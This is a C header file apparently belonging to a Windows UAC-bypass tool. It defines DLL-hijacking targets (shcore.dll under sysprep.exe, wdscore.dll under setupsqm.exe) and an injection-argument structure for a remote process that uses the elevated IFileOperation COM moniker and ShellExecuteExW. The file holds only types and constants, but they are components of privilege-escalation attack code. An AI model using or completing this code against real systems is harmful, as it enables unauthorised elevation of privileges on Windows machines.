/*++

Module Name:

	types.h

Abstract:

	This file contains global types definitions and external variables.

--*/

#define BUFFER_LENGTH 512
//#define _DEBUGSHELL
#define OLD_METHOD

#ifdef OLD_METHOD
#define TARGETDLL      L"shcore.dll"
#define TARGETDIR      L"\\sysprep"
#define TARGETPROCESS  L"\\sysprep\\sysprep.exe"
#define TARGETDLLPATH  L"\\sysprep\\shcore.dll"
#else
#define TARGETDLL      L"wdscore.dll"
#define TARGETDIR      L"\\oobe"
#define TARGETPROCESS  L"\\oobe\\setupsqm.exe"
#define TARGETDLLPATH  L"\\oobe\\wdscore.dll"
#endif


typedef struct _PROGRAM_CONTEXT {
	HANDLE hRemoteProcess;
	WCHAR szSystemDirectory[MAX_PATH];
} PROGRAM_CONTEXT, *PPROGRAM_CONTEXT;

typedef BOOL (WINAPI *PFNFreeLibrary)(HMODULE hLibModule);
typedef HMODULE (WINAPI *PFNLoadLibrary)(LPCWSTR lpLibFileName);
typedef FARPROC (WINAPI *PFNGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef BOOL (WINAPI *PFNCloseHandle)(HANDLE);
typedef DWORD (WINAPI *PFNWaitForSingleObject)(HANDLE, DWORD);

typedef VOID (WINAPI *PFNOutputDebugStringA)(LPCSTR lpOutputString);
typedef VOID (WINAPI *PFNOutputDebugStringW)(LPCWSTR lpOutputString);

typedef struct _INJECT_ARGS {
	PFNFreeLibrary pfnFreeLibrary;
	PFNLoadLibrary pfnLoadLibrary;
	PFNGetProcAddress pfnGetProcAddress;
	PFNCloseHandle pfnCloseHandle;
	PFNWaitForSingleObject pfnWaitForSingleObject;
#ifdef _DEBUGSHELL
	PFNOutputDebugStringA pfnOutputDebugStringA;
	PFNOutputDebugStringW pfnOutputDebugStringW;
#endif
	CONST WCHAR *szSourceDll;
	CONST WCHAR *szElevDir;
	CONST WCHAR *szElevDll;
	CONST WCHAR *szElevDllFull;
	CONST WCHAR *szElevExeFull;
	WCHAR *szElevArgs; 
	CONST WCHAR *szEIFOMoniker; 
	CONST IID *pIID_EIFOClass;
	CONST IID *pIID_EIFO;
	CONST IID *pIID_ShellItem2;
	CONST IID *pIID_Unknown;
	CONST WCHAR *szShell32;
	CONST WCHAR *szOle32;
	CONST CHAR *szCoInitialize;
	CONST CHAR *szCoUninitialize;
	CONST CHAR *szCoGetObject;
	CONST CHAR *szCoCreateInstance;
	CONST CHAR *szSHCreateItemFPN;
	CONST CHAR *szShellExecuteExW;
} INJECT_ARGS, *PINJECT_ARGS;

//unused, future use
typedef struct _INJECT_DATA {
	WCHAR szSourceDll[MAX_PATH]; //0
	WCHAR szElevDir[MAX_PATH];   //520
	WCHAR szElevDll[MAX_PATH];   //520*2
	WCHAR szElevDllFull[MAX_PATH]; //520*3 
	WCHAR szElevExeFull[MAX_PATH]; //520*4
	WCHAR szElevArgs[MAX_PATH];   //520*5
	WCHAR szEIFOMoniker[MAX_PATH]; //520*6
	WCHAR szShell32[32]; //3120
	WCHAR szOle32[32]; //3120+32
	CHAR szCoInitialize[32]; //3120+(32*2)
	CHAR szCoUninitialize[32];//3120+(32*3)
	CHAR szCoGetObject[32];//3120+(32*4)
	CHAR szCoCreateInstance[32];//3120+(32*5)
	CHAR szSHCreateItemFPN[32];//3120+(32*6)
	CHAR szShellExecuteExW[32];//3120+(32*7)
} INJECT_DATA, *PINJECT_DATA;